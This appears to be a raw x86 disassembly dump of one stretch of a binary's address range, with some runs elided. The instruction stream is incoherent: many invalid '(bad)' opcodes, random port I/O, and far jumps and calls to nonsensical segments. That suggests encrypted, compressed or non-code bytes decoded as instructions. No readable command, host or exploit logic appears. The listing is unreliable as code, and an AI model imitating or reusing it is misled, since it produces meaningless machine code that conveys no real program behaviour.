  418182:	mov    eax,ds:0x6161f3da
  418187:	mov    ch,0xa8
  418189:	jae    0x418191
  41818b:	push   edi
  41818c:	xchg   DWORD PTR ds:0x92fec80,ecx
  418192:	push   ebx
  418193:	dec    ebp
  418194:	cs jmp 0x8c9a26e4
  41819a:	lahf   
  41819b:	inc    esi
  41819c:	adc    DWORD PTR [ecx-0x3bd9ff6d],ebx
  4181a2:	jle    0x4181d0
  4181a4:	nop
  4181a5:	dec    edi
  4181a6:	dec    esi
  4181a7:	jp     0x41815b
  4181a9:	add    bl,BYTE PTR [ecx-0x36bc51d7]
  4181af:	lock dec eax
  4181b1:	mov    dl,0xc
  4181b3:	rol    al,1
  4181b5:	adc    al,0xde
  4181b7:	test   al,0x2a
  4181b9:	pop    eax
  4181ba:	daa    
  4181bb:	in     al,0x20
  4181bd:	lods   eax,DWORD PTR ds:[esi]
  4181be:	push   cs
  4181bf:	sub    DWORD PTR [edx-0x602ffc89],edi
  4181c5:	sbb    ebx,ebx
  4181c7:	jg     0x418193
  4181c9:	xchg   ebx,ebp
  4181cb:	in     eax,dx
  4181cc:	xor    dh,BYTE PTR [eax-0x52]
  4181cf:	in     eax,dx
  4181d0:	loop   0x418201
  4181d2:	je     0x4181ff
  4181d4:	loopne 0x4181ac
  4181d6:	sub    DWORD PTR [ebp+0x7db02bc9],0x1b5d4716
  4181e0:	cmc    
  4181e1:	and    al,0xad
  4181e3:	sub    BYTE PTR [eax],dh
  4181e5:	fucomi st,st(3)
  4181e7:	adc    eax,0xe616e705
  4181ec:	dec    ecx
  4181ed:	cmp    ch,BYTE PTR [ebp-0x3d128793]
  4181f3:	loopne 0x418182
  4181f5:	ja     0x4181df
  4181f7:	adc    BYTE PTR [edx+eax*1+0x62819739],bh
  4181fe:	sbb    BYTE PTR [edx+0x65],ah
  418201:	ficomp WORD PTR [eax-0x27]
  418204:	mov    cl,0x8c
  418206:	jbe    0x41827e
  418208:	inc    edx
  418209:	dec    eax
  41820a:	pushf  
  41820b:	(bad)  
  41820c:	xlat   BYTE PTR ds:[ebx]
  41820d:	add    esi,ebp
  41820f:	cdq    
	...
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0xe5a5b8d6
  418282:	ret    
  418283:	inc    esp
  418284:	nop
  418285:	inc    DWORD PTR [eax]
  418287:	add    BYTE PTR [ecx+eax*1],al
  41828a:	add    BYTE PTR [eax],al
  41828c:	add    dl,ah
  41828e:	idiv   DWORD PTR [edx+0x66]
  418291:	mov    eax,ds:0x9e4206dd
  418296:	aaa    
  418297:	adc    eax,0x7015b13b
  41829c:	lds    edx,FWORD PTR [ecx+0x7c]
  41829f:	pop    eax
  4182a0:	inc    ebx
  4182a1:	xor    edx,ebx
  4182a3:	sub    BYTE PTR [ecx],ch
  4182a5:	inc    esi
  4182a6:	daa    
  4182a7:	mov    edi,0xcbd0b524
  4182ac:	fisub  DWORD PTR [eax+0xbaf3ff7]
  4182b2:	neg    BYTE PTR [eax+0x338eb363]
  4182b8:	and    al,0xdb
  4182ba:	mov    bh,0x62
  4182bc:	fstp   QWORD PTR [esi+0x6f]
  4182bf:	mov    bh,0x58
  4182c1:	pop    esp
  4182c2:	out    0xff,eax
  4182c4:	push   edi
  4182c5:	xchg   esp,eax
  4182c6:	sub    esi,edi
  4182c8:	das    
  4182c9:	mov    bl,0xc
  4182cb:	add    ch,BYTE PTR [ecx-0x75]
  4182ce:	jns    0x4182c7
  4182d0:	hlt    
  4182d1:	fwait
  4182d2:	adc    cl,bh
  4182d4:	repnz add ch,BYTE PTR [edi]
  4182d7:	dec    BYTE PTR [esi-0x5656f0b3]
  4182dd:	push   esi
  4182de:	les    esi,FWORD PTR [eax+esi*8]
  4182e1:	es inc eax
  4182e3:	jmp    0x195d:0x5c4ece11
  4182ea:	fist   DWORD PTR [esi+ecx*4]
  4182ed:	mov    ds:0xb2d98bc8,al
  4182f2:	and    BYTE PTR [ebx+esi*1],dh
  4182f5:	sub    DWORD PTR [eax],edi
  4182f7:	scas   eax,DWORD PTR es:[edi]
  4182f8:	jl     0x418378
  4182fa:	add    al,0xd9
  4182fc:	outs   dx,BYTE PTR ds:[esi]
  4182fd:	and    BYTE PTR [esi-0x4cf90ba5],bh
  418303:	call   0x2c715ddc
  418308:	xlat   BYTE PTR ds:[ebx]
  418309:	shr    BYTE PTR [eax],1
  41830b:	lahf   
  41830c:	loope  0x41832b
  41830e:	adc    dl,cl
  418310:	mov    edx,0x28a84d23
  418315:	bound  esp,QWORD PTR [ebx+0x75]
  418318:	cmp    edi,DWORD PTR [eax]
  41831a:	cld    
  41831b:	mov    dh,ah
  41831d:	sbb    al,0x73
  41831f:	lods   eax,DWORD PTR ds:[esi]
  418320:	jp     0x41834d
  418322:	sbb    BYTE PTR [ecx],ch
  418324:	jmp    0xd4e9ef47
  418329:	or     al,0x53
  41832b:	adc    al,0x45
  41832d:	sub    ecx,ecx
  41832f:	out    0x30,eax
  418331:	sub    BYTE PTR [ecx],0xff
  418334:	xchg   ebx,eax
  418335:	jmp    FWORD PTR [ebp-0x710984eb]
  41833b:	push   ss
  41833c:	(bad)  
  41833d:	jmp    0xbc073c65
  418342:	jnp    0x4182d6
  418344:	or     eax,0xcb66ee80
  418349:	enter  0xa985,0x57
  41834d:	mov    ebx,0x16625ffc
  418352:	test   esi,0x96304ae6
  418358:	rcl    BYTE PTR [edx+0x7df8bdc3],0x49
  41835f:	or     al,BYTE PTR [ebp+0x320d7791]
  418365:	sbb    ecx,ebp
  418367:	rcl    BYTE PTR [ebx],cl
  418369:	jne    0x418379
  41836b:	rol    DWORD PTR [esi-0x77138517],cl
  418371:	aaa    
  418372:	sub    edx,ebx
  418374:	cli    
  418375:	out    0x27,eax
  418377:	mov    esp,0x9f4ca52a
  41837c:	xor    dl,BYTE PTR [ecx]
  41837e:	mov    al,0xe
  418380:	mov    dl,0x41
  418382:	repnz pop es
  418384:	pop    esp
  418385:	lahf   
  418386:	adc    DWORD PTR [ebx+0x4998066e],0x76
  41838d:	mov    dh,0xac
  41838f:	inc    edi
	...
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	jmp    0x100:0x94abebc4
  418407:	add    BYTE PTR [ecx+eax*1],al
  41840a:	add    BYTE PTR [eax],al
  41840c:	(bad)  
  41840d:	push   edx
  41840e:	mov    ebp,0x440666f0
  418413:	cwde   
  418414:	outs   dx,BYTE PTR ds:[esi]
  418415:	iret   
  418416:	push   ebp
  418417:	and    esp,esi
  418419:	adc    ebp,DWORD PTR [ebx+0x6ca4d9df]
  41841f:	sahf   
  418420:	adc    BYTE PTR [edx+0x2b],bl
  418423:	and    DWORD PTR [eax],0x1f9d7b05
  418429:	add    eax,DWORD PTR [ecx+ebx*4+0x4b]
  41842d:	jne    0x41848d
  41842f:	push   ds
  418430:	push   eax
  418431:	cli    
  418432:	or     eax,0xffffffd0
  418435:	sar    BYTE PTR [edi+0x16bcb151],0x92
  41843c:	sbb    bh,BYTE PTR ds:0x234029bb
  418442:	add    al,0x64
  418444:	inc    eax
  418445:	mov    ds:0x2f49030e,eax
  41844a:	lock pop ds
  41844c:	imul   eax,DWORD PTR [eax-0x1f39714e],0xffffffb9
  418453:	test   BYTE PTR [esi],ch
  418455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418456:	xrelease mov DWORD PTR [ecx+0x2],esp
  41845a:	pop    esp
  41845b:	cld    
  41845c:	push   0x62
  41845e:	push   eax
  41845f:	cmp    edi,eax
  418461:	pusha  
  418462:	xor    al,0x14
  418464:	(bad)  [eax+edi*4+0x31d877e1]
  41846b:	sbb    dl,BYTE PTR [ebx-0x59]
  41846e:	gs jae 0x41848f
  418471:	inc    ebp
  418472:	(bad)  
  418473:	mov    dh,0x5c
  418475:	into   
  418476:	sbb    DWORD PTR [edx],esi
  418478:	ret    
  418479:	cdq    
  41847a:	xor    bh,bh
  41847c:	imul   edi,esp,0xffffffd1
  41847f:	mov    WORD PTR [ebp+0x596b2bf7],es
  418485:	nop
  418486:	retf   
  418487:	pop    es
  418488:	xchg   esp,eax
  418489:	add    eax,0xdb0cecf5
  41848e:	inc    ecx
  41848f:	add    BYTE PTR [ecx+0x5c],dl
  418492:	mov    dl,0x59
  418494:	aaa    
  418495:	outs   dx,BYTE PTR ds:[esi]
  418496:	fdivr  QWORD PTR [edi]
  418498:	or     eax,0xc612dd58
  41849d:	jg     0x4184e5
  41849f:	aam    0x24
  4184a1:	mov    eax,DWORD PTR [edx]
  4184a3:	dec    ecx
  4184a4:	loope  0x4184ca
  4184a6:	push   cs
  4184a7:	dec    esi
  4184a8:	or     BYTE PTR [ecx+0x5b],cl
  4184ab:	ins    BYTE PTR es:[edi],dx
  4184ac:	adc    BYTE PTR [ebx-0x40],al
  4184af:	fcom   QWORD PTR [eax]
  4184b1:	mov    ah,0xda
  4184b3:	or     dh,BYTE PTR [esi]
  4184b5:	cmp    cl,BYTE PTR [ebx-0xd0aa8fc]
  4184bb:	test   BYTE PTR [edi+0x4b],dh
  4184be:	(bad)  
  4184c0:	enter  0xc3c5,0xdd
  4184c4:	add    DWORD PTR [ebx+0x44],edi
  4184c7:	(bad)  
  4184c8:	fld    TBYTE PTR [edi-0xe]
  4184cb:	mov    ebx,0x487e13f4
  4184d0:	mov    BYTE PTR [ebx],0xd7
  4184d3:	xchg   esp,eax
  4184d4:	out    dx,al
  4184d5:	test   al,0x12
  4184d8:	jmp    0x53c6c489
  4184dd:	vpsraw xmm2,xmm6,XMMWORD PTR [edx+edx*2+0x9]
  4184e3:	jb     0x4184a2
  4184e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184e6:	lock cmp cl,0x69
  4184ea:	jo     0x4184ee
  4184ec:	jle    0x418521
  4184ee:	xor    BYTE PTR [ebx-0x32b5f4a9],dh
  4184f4:	jae    0x418518
  4184f6:	rol    ah,1
  4184f8:	mov    ah,0x26
  4184fa:	mov    esp,0xeef6e280
  4184ff:	aam    0xbb
  418501:	mov    eax,ds:0x6a865e8b
  418506:	call   0x8378034e
  41850b:	jnp    0x418534
  41850d:	push   ecx
  41850e:	xor    al,0xb6
	...
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	mov    ds:0x98394067,al
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR [ecx+eax*1],al
  41858a:	add    BYTE PTR [eax],al
  41858c:	push   ebx
  41858d:	inc    edx
  41858e:	add    al,0xcc
  418590:	fadd   st(6),st
  418592:	or     DWORD PTR [eax+ebx*1],eax
  418595:	stc    
  418596:	cmp    dl,BYTE PTR [ebp+eax*8-0x1c]
  41859a:	(bad)  
  41859b:	bound  edx,QWORD PTR [eax+0x14379495]
  4185a1:	sar    DWORD PTR ds:0xe00fc7db,cl
  4185a7:	cmp    eax,0x5196cee3
  4185ac:	pusha  
  4185ad:	inc    eax
  4185ae:	sub    ebx,edx
  4185b0:	mov    ebp,0x38856aa2
  4185b5:	or     DWORD PTR [eax],ecx
  4185b7:	fwait
  4185b8:	aad    0x15
  4185ba:	test   BYTE PTR [eax+0x81a590],al
  4185c0:	inc    ecx
  4185c1:	fimul  DWORD PTR [esp+ebx*2-0x17e0aedb]
  4185c8:	and    ebp,DWORD PTR [ebx+0x4e]
  4185cb:	fsubr  QWORD PTR [ebp+ecx*1+0x79eb5163]
  4185d2:	dec    ecx
  4185d3:	or     DWORD PTR [ebx+0x5e],ebp
  4185d6:	xchg   ebp,eax
  4185d7:	xchg   ecx,eax
  4185d8:	imul   BYTE PTR ds:0x5c8df26e
  4185de:	jns    0x4185a8
  4185e0:	call   0x1102453
  4185e5:	jo     0x41863d
  4185e7:	fsub   QWORD PTR [edi-0x47abbd3e]
  4185ed:	rcr    DWORD PTR [ecx],0xb5
  4185f0:	add    bh,BYTE PTR [ebx+0x2579e5b5]
  4185f6:	mov    esp,0x9c3ad713
  4185fb:	mov    ebp,0x191562ca
  418600:	sub    BYTE PTR [ebx+edi*4+0x4d5a48d8],ah
  418607:	mov    esi,DWORD PTR [esi]
  418609:	sub    al,0xbb
  41860b:	jnp    0x41864d
  41860d:	mov    bl,0x75
  41860f:	adc    al,0xbc
  418611:	cdq    
  418612:	push   edi
  418613:	pop    esp
  418614:	neg    BYTE PTR [ecx]
  418616:	inc    esp
  418617:	das    
  418618:	xchg   esp,eax
  418619:	push   esp
  41861a:	leave  
  41861b:	ret    0x7823
  41861e:	pop    ds
  41861f:	outs   dx,BYTE PTR ds:[esi]
  418620:	cmp    al,BYTE PTR [esi]
  418622:	aam    0x57
  418624:	mov    edx,0x6f8af089
  418629:	mov    ds:0x4712010c,al
  41862e:	pop    es
  41862f:	lock pop eax
  418631:	and    al,0x58
  418633:	test   al,0xf6
  418635:	in     eax,0xe1
  418637:	pop    esi
  418638:	or     edi,DWORD PTR [eax]
  41863a:	mov    ah,0xbf
  41863c:	pop    edx
  41863d:	pop    esi
  41863e:	adc    bl,ch
  418640:	push   es
  418641:	bound  esi,QWORD PTR [ebx-0xc9ac75c]
  418647:	fnstenv [edi-0x2ca95cbf]
  41864d:	adc    eax,0xab72278b
  418652:	sbb    ecx,DWORD PTR [edi]
  418654:	rcl    BYTE PTR [edx+ebx*2+0x2ca6f23e],1
  41865b:	lock popf 
  41865d:	jne    0x41867e
  41865f:	push   edi
  418660:	and    BYTE PTR [ebx-0x1d11781],dh
  418666:	stos   BYTE PTR es:[edi],al
  418667:	out    dx,eax
  418668:	popf   
  418669:	popa   
  41866a:	scas   eax,DWORD PTR es:[edi]
  41866b:	push   esp
  41866c:	bound  edi,QWORD PTR [esp+edi*4+0x3a433691]
  418673:	call   0x3ce8:0xcac4087d
  41867a:	pop    edx
  41867b:	dec    esi
  41867c:	xlat   BYTE PTR ds:[ebx]
  41867d:	call   0xa07e:0x45687742
  418684:	call   0x7370ff71
  418689:	dec    edi
  41868a:	cs or  eax,0x7fd62779
	...
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	aad    0x9d
  418702:	jmp    0x418686
  418704:	pushf  
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR [ecx+eax*1],al
  41870a:	add    BYTE PTR [eax],al
  41870c:	fst    DWORD PTR [esi]
  41870e:	gs pop eax
  418710:	aaa    
  418711:	inc    eax
  418712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418713:	lea    edi,[ebx-0x695b3b83]
  418719:	addr16 add ch,ah
  41871c:	mov    eax,0x53304f2b
  418721:	sbb    DWORD PTR [edx-0x748d4770],eax
  418727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418728:	in     al,dx
  418729:	clc    
  41872a:	sub    esi,DWORD PTR [edx+eiz*2+0x24]
  41872e:	ret    
  41872f:	scas   al,BYTE PTR es:[di]
  418731:	or     al,bl
  418733:	and    edi,DWORD PTR [esi-0x556c9c55]
  418739:	mov    eax,ds:0xf7b89fe0
  41873e:	add    al,0xdf
  418740:	jmp    0x418753
  418742:	cmp    ecx,DWORD PTR [ebp-0x48c23612]
  418748:	mov    WORD PTR [edx-0x51],gs
  41874b:	dec    esp
  41874c:	aam    0x6f
  41874e:	shr    ah,1
  418750:	daa    
  418751:	sahf   
  418752:	ret    0x8318
  418755:	xchg   edi,eax
  418756:	sti    
  418757:	push   edi
  418758:	enter  0xbb5f,0x12
  41875c:	aaa    
  41875d:	fdivr  QWORD PTR [edi-0x74ab7b18]
  418763:	js     0x4187e3
  418765:	lds    esi,FWORD PTR [edi]
  418767:	mov    WORD PTR [eax],ss
  418769:	push   esp
  41876a:	mov    edx,0x4830a9f3
  41876f:	mov    cl,0x46
  418771:	mov    BYTE PTR ds:0xe1c9d08b,dh
  418777:	iret   
  418778:	or     al,BYTE PTR [edi-0x4e260465]
  41877e:	pusha  
  41877f:	into   
  418780:	pop    es
  418781:	push   eax
  418782:	(bad)  
  418783:	loope  0x4187de
  418785:	push   edi
  418786:	popa   
  418787:	mov    ch,bh
  418789:	fucom  st(4)
  41878b:	(bad)  
  41878c:	aam    0xf4
  41878e:	sar    BYTE PTR [esi+ebp*4],0xe7
  418792:	or     eax,0x91bba0e4
  418797:	pop    ecx
  418798:	xchg   ch,ah
  41879a:	sub    edi,DWORD PTR [edx-0xfcc8f27]
  4187a0:	cli    
  4187a1:	ins    DWORD PTR es:[edi],dx
  4187a2:	xor    eax,0xb827d617
  4187a7:	cmp    esi,DWORD PTR [ecx-0x30dffbc8]
  4187ad:	aad    0x40
  4187af:	stc    
  4187b0:	xor    al,0xa0
  4187b2:	push   esi
  4187b3:	xor    al,0xa2
  4187b5:	cmp    eax,0x5ae029ce
  4187ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187bb:	jae    0x41883c
  4187bd:	add    BYTE PTR [edi+0xa700fe0],ch
  4187c3:	cwde   
  4187c4:	xchg   esp,eax
  4187c5:	jns    0x4187e6
  4187c7:	ds loopne 0x41875b
  4187ca:	fsubr  QWORD PTR [esi-0x72b5671d]
  4187d0:	add    eax,0x24448e5d
  4187d5:	xor    eax,0xfc3b0628
  4187da:	jge    0x41880e
  4187dc:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4187de:	pop    esi
  4187df:	mov    eax,esp
  4187e1:	push   ebx
  4187e2:	jle    0x418821
  4187e4:	stc    
  4187e5:	(bad)  
  4187e6:	sbb    DWORD PTR [ebx+0xbaa602a],edi
  4187ec:	scas   eax,DWORD PTR es:[edi]
  4187ed:	imul   ebx,DWORD PTR [ecx],0x3e3eb4ab
  4187f3:	loopne 0x4187eb
  4187f5:	dec    ecx
  4187f6:	mov    esi,ebx
  4187f8:	aas    
  4187f9:	dec    edx
  4187fa:	or     cl,ah
  4187fc:	mov    ecx,0xdc5f49ca
  418801:	leave  
  418802:	fdiv   DWORD PTR [eax+0x70]
  418805:	ds in  al,0x42
  418808:	mov    eax,0xea4b6cd5
  41880d:	(bad)  
  41880e:	inc    esp
  41880f:	add    eax,0x0
	...
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi+0x389c3acd]
  418881:	jbe    0x41887b
  418883:	aas    
  418884:	mov    al,ds:0x4000103
  418889:	add    DWORD PTR [eax],eax
  41888b:	add    BYTE PTR ds:0x56820e8e,dl
  418891:	lods   eax,DWORD PTR ds:[esi]
  418892:	pop    eax
  418893:	jb     0x4188d9
  418895:	push   ebx
  418896:	cmp    al,0x1
  418898:	test   ebp,edi
  41889a:	int3   
  41889b:	mov    ebp,0xad1e690a
  4188a0:	out    dx,al
  4188a1:	pop    ebp
  4188a2:	stc    
  4188a3:	push   es
  4188a4:	add    al,0xe
  4188a6:	or     BYTE PTR [ebx],0xdc
  4188a9:	dec    edi
  4188aa:	ud0    ebx,ebx
  4188ad:	xchg   ecx,eax
  4188ae:	mov    cs,WORD PTR [ecx-0x5b7a2c2d]
  4188b4:	pop    ds
  4188b5:	test   al,0x15
  4188b7:	mov    ebx,0x4cc0ce18
  4188bc:	xor    edx,DWORD PTR [ebx]
  4188be:	or     ecx,edi
  4188c0:	mov    ebp,0x305d7867
  4188c5:	out    0xf8,eax
  4188c7:	xor    BYTE PTR [ecx+0x9],ch
  4188ca:	jno    0x4188d0
  4188cc:	std    
  4188cd:	jns    0x41891a
  4188cf:	adc    al,0x6e
  4188d1:	stc    
  4188d2:	mov    ch,0xdd
  4188d4:	jae    0x41892e
  4188d6:	sub    al,0x66
  4188d8:	mov    BYTE PTR [esi+0x1b],bh
  4188db:	dec    BYTE PTR [edx+ecx*8-0x57]
  4188df:	push   edi
  4188e0:	mov    edx,DWORD PTR [ebx+0x116ec08e]
  4188e6:	add    eax,0x9ec46893
  4188eb:	lods   eax,DWORD PTR ds:[esi]
  4188ec:	enter  0x9e00,0xef
  4188f0:	pop    edi
  4188f1:	pop    ebx
  4188f2:	pop    ecx
  4188f3:	xor    ah,BYTE PTR [ebx+0x3876a607]
  4188f9:	mov    edi,DWORD PTR [ebx-0x2]
  4188fc:	xchg   edx,eax
  4188fd:	sub    al,0x54
  4188ff:	jle    0x41893a
  418901:	gs push 0x5c
  418904:	loop   0x41891e
  418906:	dec    ebp
  418907:	jmp    0x4188a9
  418909:	sbb    al,BYTE PTR [ebx+0x58]
  41890c:	in     eax,0xdf
  41890e:	adc    eax,0x721d4802
  418913:	adc    esp,DWORD PTR [ecx+0x6d]
  418916:	fs xchg edx,eax
  418918:	xchg   edx,eax
  418919:	push   edx
  41891a:	add    eax,0xd487c9a0
  41891f:	int3   
  418920:	inc    edi
  418921:	push   0x15cb9cb3
  418926:	jmp    0x4188c5
  418928:	pusha  
  418929:	dec    edi
  41892a:	dec    esi
  41892b:	adc    eax,0xd88d37e0
  418930:	jl     0x41899e
  418932:	data16 jecxz 0x418959
  418935:	ficomp DWORD PTR [eax]
  418937:	lds    ecx,FWORD PTR ds:0xcaacb6bf
  41893d:	call   0xbede:0x22fb8cb1
  418944:	in     eax,dx
  418945:	pop    esi
  418946:	inc    ebp
  418947:	(bad)
  41894a:	mov    al,0xa3
  41894c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41894e:	aad    0x85
  418950:	test   BYTE PTR [esp+esi*4],cl
  418953:	je     0x4189d4
  418955:	dec    ecx
  418956:	add    BYTE PTR [ebp-0x846e90b],dl
  41895c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41895d:	cmc    
  41895e:	mov    dh,0x5e
  418960:	inc    BYTE PTR [edi+edx*8]
  418963:	sub    eax,0xcf3aab9c
  418968:	push   eax
  418969:	fxam   
  41896b:	cdq    
  41896c:	lods   eax,DWORD PTR ds:[esi]
  41896d:	dec    ebx
  41896e:	adc    eax,0x78e8840e
  418973:	cmp    ebx,DWORD PTR [eax]
  418975:	lock mov edi,0xa19f76d5
  41897b:	lahf   
  41897c:	ins    BYTE PTR es:[edi],dx
  41897d:	add    edi,ebp
  41897f:	(bad)  
  418980:	aam    0xb8
  418982:	out    dx,al
  418983:	sbb    ch,al
  418985:	jbe    0x418968
  418987:	(bad)  
  418988:	sub    ebx,DWORD PTR [ebp-0xe6b8f58]
  41898e:	and    al,0x88
	...
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xefadd969
  418a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR [ecx+eax*1],al
  418a0a:	add    BYTE PTR [eax],al
  418a0c:	mov    esp,0xe995c3a4
  418a11:	in     eax,0xb2
  418a13:	push   ebx
  418a14:	xor    ch,dl
  418a16:	jl     0x418a0a
  418a18:	stos   BYTE PTR es:[edi],al
  418a19:	mov    ebx,0xd7b8638e
  418a1e:	leave  
  418a1f:	jnp    0x4189cd
  418a21:	xor    al,0xef
  418a23:	aas    
  418a24:	(bad)  
  418a25:	cmp    dl,BYTE PTR [esi+esi*4-0x7a]
  418a29:	add    eax,0xb0dd407
  418a2e:	push   edi
  418a2f:	shl    DWORD PTR [esp+eax*8],cl
  418a32:	mov    esi,0xe4c2b4ce
  418a37:	mov    cl,0x35
  418a39:	cli    
  418a3a:	xchg   edx,eax
  418a3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a3c:	mov    edi,DWORD PTR [edi+0x6]
  418a3f:	pop    ebp
  418a40:	cmp    ah,BYTE PTR ds:0x85d95326
  418a46:	adc    BYTE PTR [edx],dh
  418a48:	lea    edx,[ebp+0x23]
  418a4b:	gs sbb eax,0x2b9478de
  418a51:	mov    ah,0xad
  418a53:	dec    edx
  418a54:	repz adc BYTE PTR [eax+ebx*8+0x1],bl
  418a59:	mov    ecx,DWORD PTR [eax+0x4b]
  418a5c:	mov    eax,DWORD PTR [esi+0x1f]
  418a5f:	xchg   edx,eax
  418a60:	daa    
  418a61:	mov    ebx,0xaa9d4977
  418a66:	lock (bad) [ebx-0x67]
  418a6a:	retf   0xb7f7
  418a6d:	adc    edx,edx
  418a6f:	shl    ecx,1
  418a71:	repz add DWORD PTR [ebp+0x4e1c908e],0xffffffa5
  418a79:	ficom  WORD PTR [ebp-0x1e]
  418a7c:	sbb    eax,0xc8e6178
  418a81:	mov    ebp,0x8f48341e
  418a86:	cmp    ecx,edx
  418a88:	lahf   
  418a89:	imul   esi,DWORD PTR [ebx-0x68f1faa2],0x902d1588
  418a93:	sub    al,0x26
  418a95:	mov    ds:0xa30acd58,al
  418a9a:	repz cld 
  418a9c:	mov    eax,0xed2e0565
  418aa1:	scas   eax,DWORD PTR es:[edi]
  418aa2:	push   esi
  418aa3:	outs   dx,DWORD PTR ds:[esi]
  418aa4:	push   edx
  418aa5:	jp     0x418ac9
  418aa7:	mov    al,ds:0x17d78c4c
  418aac:	fwait
  418aad:	cdq    
  418aae:	dec    eax
  418aaf:	(bad)  
  418ab0:	std    
  418ab1:	add    al,BYTE PTR [edi-0x27]
  418ab4:	repnz bound ebp,QWORD PTR [eax-0x2204b288]
  418abb:	out    dx,eax
  418abc:	or     BYTE PTR [ebx-0x1e595e7d],dl
  418ac2:	arpl   WORD PTR [ebx],bx
  418ac4:	jnp    0x418ac5
  418ac6:	jge    0x418a5d
  418ac8:	scas   eax,DWORD PTR es:[edi]
  418ac9:	xchg   esp,eax
  418aca:	push   esi
  418acb:	shl    esp,1
  418acd:	ins    DWORD PTR es:[edi],dx
  418ace:	and    al,0xbe
  418ad0:	fs pusha 
  418ad2:	mul    bh
  418ad4:	sar    DWORD PTR [esi+0x706cf7a5],1
  418ada:	aad    0x81
  418adc:	jg     0x418b03
  418ade:	dec    ebx
  418adf:	pop    ebp
  418ae0:	outs   dx,BYTE PTR ds:[esi]
  418ae1:	jno    0x418aed
  418ae3:	aas    
  418ae4:	push   ebx
  418ae5:	ins    BYTE PTR es:[edi],dx
  418ae6:	jb     0x418b48
  418ae8:	cmc    
  418ae9:	test   DWORD PTR [edx-0x23],ebx
  418aec:	mov    WORD PTR [edi+0x623ffb26],ds
  418af2:	add    eax,0x1bd14e2a
  418af7:	xor    DWORD PTR [ebp+0x2],esp
  418afa:	cli    
  418afb:	or     DWORD PTR [ecx],ebx
  418afd:	sub    BYTE PTR [edi],0x25
  418b00:	jmp    0xdad0ee2c
  418b05:	adc    DWORD PTR [esi],0xa3f07903
  418b0b:	and    ebx,ebx
  418b0d:	mov    ds:0x6be6,al
	...
  418b72:	add    BYTE PTR [eax],al
  418b74:	jl     0x418b89
  418b76:	test   DWORD PTR [edx],esi
  418b78:	out    dx,eax
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x5d
  418b81:	shr    ebx,1
  418b83:	sbb    DWORD PTR [eax+0x4000105],ebp
  418b89:	add    DWORD PTR [eax],eax
  418b8b:	add    BYTE PTR [esp+ecx*1+0x5ccdca7e],ch
  418b92:	push   ebp
  418b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b94:	sar    cl,1
  418b96:	aaa    
  418b97:	pop    ebp
  418b98:	sar    BYTE PTR [ebx],1
  418b9a:	frstor [edi]
  418b9c:	cwde   
  418b9d:	xchg   ecx,eax
  418b9e:	psrad  mm1,QWORD PTR fs:[esi]
  418ba2:	mov    esi,0xbb9e22c0
  418ba7:	enter  0x8125,0x99
  418bab:	mov    al,ds:0xc66e5995
  418bb0:	sbb    al,0x17
  418bb2:	jne    0x418c05
  418bb4:	call   0x31553616
  418bb9:	lods   eax,DWORD PTR ds:[esi]
  418bba:	xor    DWORD PTR [ecx-0x79],edx
  418bbd:	dec    esi
  418bbe:	mov    bh,0xb3
  418bc0:	out    0x52,eax
  418bc2:	jne    0x418be3
  418bc4:	cmp    DWORD PTR [edx-0x3f],0x24
  418bc8:	retf   0x6874
  418bcb:	push   ebp
  418bcc:	add    al,0x5d
  418bce:	cmp    DWORD PTR [eax-0x74],edx
  418bd1:	loopne 0x418bd9
  418bd3:	jle    0x418b83
  418bd5:	inc    ebp
  418bd6:	add    eax,0xd62986dc
  418bdb:	cld    
  418bdc:	mov    dl,0x27
  418bde:	inc    esp
  418bdf:	jle    0x418c47
  418be1:	loopne 0x418bce
  418be3:	cmc    
  418be4:	hlt    
  418be5:	das    
  418be6:	or     ebp,DWORD PTR [eax+0x493deb46]
  418bec:	or     DWORD PTR [ecx+eax*4+0x2130ee90],ebx
  418bf3:	pop    eax
  418bf4:	repnz test DWORD PTR [ecx-0x5d],edi
  418bf8:	sbb    eax,0xf2187d38
  418bfd:	mov    dl,0x3f
  418bff:	out    dx,al
  418c00:	gs mov ch,0x2
  418c03:	pop    ss
  418c04:	out    0x71,eax
  418c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c07:	sbb    BYTE PTR [ebx],bh
  418c09:	mov    edx,0x884b0f38
  418c0e:	push   ebp
  418c0f:	loope  0x418c27
  418c11:	adc    al,0x18
  418c13:	xchg   ebx,eax
  418c14:	cmp    ch,ah
  418c16:	retf   
  418c17:	loopne 0x418c5f
  418c19:	mov    eax,0x52d41138
